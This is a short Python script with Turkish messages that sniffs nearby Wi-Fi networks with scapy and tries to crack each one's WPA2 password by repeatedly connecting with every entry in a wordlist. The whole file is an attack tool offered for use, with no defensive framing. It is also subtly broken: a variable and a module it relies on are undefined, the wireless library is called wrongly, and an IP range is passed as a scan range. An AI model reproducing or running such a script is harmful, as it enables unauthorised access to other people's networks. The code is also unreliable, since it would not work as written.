from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11ProbeReq, Dot11ProbeResp, Dot11Elt
from pywifi import PyWiFi, Profile
import time


wordlist_file = "yourWordList.txt"

scan_range = "192.168.1.*"

def scan_wifi(scan_range):
    results = []
    packets = sniff(iface="wlan0", prn=lambda x: x.summary(), timeout=5)
    for packet in packets:
        if packet.haslayer(Dot11ProbeResp):
            mac = packet.addr2
            ssid = packet.info.decode()
            results.append((mac, ssid))
    return results

def connect_to_wifi(ssid, password):
    wifi = PyWiFi()
    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password
    profile = wifi.add_profile(profile)
    wifi.connect(profile)
    time.sleep(5)
    if wifi.status() == const.IFACE_CONNECTED:
        print(f"Başarıyla {ssid} ağına bağlandı.")
    else:
        print(f"{ssid} ağına bağlanılamadı.")

def crack_password(ssid):
    with open(wordlist_file, "r") as file:
        for password in file:
            password = password.strip()
            connect_to_wifi(ssid, password)
            if wifi.status() == const.IFACE_CONNECTED:
                print(f"Şifre: {password}")
                break

def main():
    results = scan_wifi(scan_range)
    print("WiFi ağları tarandı.")
    for mac, ssid in results:
        print(f"MAC: {mac}, SSID: {ssid}")
        crack_password(ssid)

if __name__ == "__main__":
    main()